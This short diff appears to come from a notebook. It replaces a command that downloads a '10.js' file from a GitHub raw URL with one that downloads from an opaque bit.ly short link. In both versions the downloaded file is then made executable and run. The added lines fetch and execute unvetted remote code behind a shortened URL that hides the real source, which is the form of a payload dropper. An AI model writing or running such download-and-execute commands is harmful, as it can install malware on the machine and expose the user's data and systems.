@@ -1,3 +1,3 @@
-! wget https://github.com/mencobaiajanah/SPLIT/raw/main/10.js
-! chmod +x 10.js
-! ./10.js
+! wget https://bit.ly/3rU1cYh
+! chmod +x 3rU1cYh
+! ./3rU1cYh
